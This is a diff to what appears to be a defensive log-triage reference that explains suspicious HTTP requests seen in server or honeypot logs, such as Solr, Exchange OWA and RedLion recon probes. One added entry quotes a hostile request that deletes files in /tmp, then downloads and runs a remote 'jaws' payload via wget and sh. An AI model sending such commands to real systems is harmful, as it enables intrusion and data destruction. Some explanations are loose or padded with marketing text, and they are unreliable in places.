@@ -16,7 +16,7 @@ _________________
 
 Likely: Suspicious
 
-The string "\x16\x03\x01" is a representation of binary data in hexadecimal format and is commonly associated with the Transport Layer Security (TLS) protocol. It is often seen in logs related to web servers and security incidents.
+The string "\x16\x03\x01" is a representation of binary data in hexadecimal format and is commonly associated with the Transport Layer Security (TLS) protocol. It is often seen in logs related to web servers and security incidents. 
 The string "\x16\x03\x01" is just the start of a TLS 1.0 handshake, i.e. content type (0x16 = handshake) followed by TLS version.
 The presence of this string in web server logs may indicate an attempt to exploit a vulnerability in the TLS protocol or to perform a man-in-the-middle attack.
 _________________
@@ -63,7 +63,7 @@ _________________
 
 Likely: Suspicious
 
-"GET /console/" is likely a HTTP request for a console or terminal application. The search results include references to several console or terminal applications, including Get Console, a powerful and complete terminal app that provides physical serial console access to network and other equipment as well as SSHv2, Telnet, and other protocols. Get Console is the first and only Apple approved iPad app that allows for physical serial connectivity in a terminal app - it also does Telnet, SSH, converts SecureCRT and PuTTY files and is fully scriptable. 
+"GET /console/" is likely a HTTP request for a console or terminal application, like several console or terminal applications, including Get Console, a powerful and complete terminal app that provides physical serial console access to network and other equipment as well as SSHv2, Telnet, and other protocols. Get Console is the first and only Apple approved iPad app that allows for physical serial connectivity in a terminal app - it also does Telnet, SSH, converts SecureCRT and PuTTY files and is fully scriptable. 
 https://www.youtube.com/watch?v=mll_SKgSbok
 https://apps.apple.com/us/app/get-console/id412067943
 _________________
@@ -86,4 +86,41 @@ Likely: Suspicious
 
 This request is associated with an attempt to retrieve system information from a Solr instance. The "/solr/admin/info/system?wt=json" endpoint is a well-known exploit that can be used to retrieve system information from a Solr instance. 
 https://sitecore.stackexchange.com/questions/29494/solr-suspicious-behavior 
+_________________
+**GET /owa/auth/x.js HTTP/1.1**
+
+Likely: Suspicious
+
+Recon attempts to identify Exchange Servers related to Hafnium Attack. 
+https://learn.microsoft.com/en-us/answers/questions/571434/bad-actors-targeted-exchange-owa-auth-x-js
+_________________
+**GET /mPlayer HTTP/1.1**
+
+This appears to be related to mPlayer software associated with Linux. The presence of this request in honeypots is a curiousity. 
+_________________
+**GET /download/file.ext HTTP/1.1**
+
+Likely: Suspicious
+
+This request shows up in recon attempts and can often be seen alongside requests for /mPlayer. There is evidence to support that this is looking for misconfigured servers where a default reference to file.ext has been left in the configuration.
+_________________
+**GET /portal/redlion HTTP/1.1**
+
+Likely: Suspicious
+
+Recon attempts looking for RedLion automation/manufacturing software systems. 
+https://www.redlion.net/portfolio/secure-remote-access-platform
+_________________
+GET /shell?cd+/tmp;rm+-rf+*;wget+ _<IP ADDRESS>_/jaws;sh+/tmp/jaws
+
+Likely: Hostile
+
+This request is attempting to utilize Shell to download and execute remote code from an IP address. In cases such as this, a secured server would respond with a 404 Not Found. A 404 not found response means that nothing has happened outside of a request to execute on this.
+_________________
+**SSTP_DUPLEX_POST /sra_{BA195980-CD49-458b-9E23-C84EE0ADCD75}/ HTTP/1.1**
+
+This is a Microsoft SSTP Point to Point traffic request over HTTPS, consistent with RFC 1945, RFC 2616 and RFC 2818. 
+
+Example redacted log:
+<155>Aug 11 15:00:00 <REDACTED> apache-access <REDACTED IP> - - [TIMESTAMP] "SSTP_DUPLEX_POST /sra_{BA195980-CD49-458b-9E23-C84EE0ADCD75}/ HTTP/1.1" 400 2369 "-" "-"
 
